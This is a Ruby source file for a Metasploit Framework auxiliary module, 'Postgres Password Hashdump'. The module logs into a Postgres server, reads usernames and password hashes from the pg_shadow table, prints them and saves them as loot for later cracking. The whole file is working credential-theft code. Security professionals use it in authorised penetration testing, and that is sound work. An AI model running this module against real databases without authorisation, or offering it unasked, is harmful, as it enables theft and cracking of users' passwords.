##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'Postgres Password Hashdump',
            'Description'    => %Q{
              This module extracts the usernames and encrypted password
              hashes from a Postgres server and stores them for later cracking.
            },
            'Author'         => ['theLightCosine'],
            'License'        => MSF_LICENSE
        )
    )
    register_options([
      OptString.new('DATABASE', [ true, 'The database to authenticate against', 'postgres']),
      ])
    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')

  end

  def run_host(ip)

    #Query the Postgres Shadow table for username and password hashes and report them
    res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)

    #Error handling routine here, borrowed heavily from todb
    case res.keys[0]
    when :conn_error
      print_error("A Connection Error occured")
      return
    when :sql_error
      case res[:sql_error]
      when /^C42501/
        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - Insufficient permissions."
        return
      else
        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - #{res[:sql_error]}"
        return
      end
    when :complete
      print_status("Query appears to have run successfully")
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'postgres',
          :proto => 'tcp'
          )

    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'Postgres Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )



    res[:complete].rows.each do |row|
      next if row[0].nil? or row[1].nil?
      next if row[0].empty? or row[1].empty?
      password = row[1]
      password.slice!(0,3)
      tbl << [row[0], password]
    end
    print_good("#{tbl.to_s}")
    report_hash(tbl.to_csv,this_service)


  end

  #Reports the Stolen Hashes back to the Database for later cracking
  def report_hash(hashtable,service)
    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_postgreshashes.txt"
    path = store_loot("postgres.hashes", "text/plain", datastore['RHOST'], hashtable, filename, "Postgres Hashes",service)
    print_status("Hash Table has been saved: #{path}")

  end




end
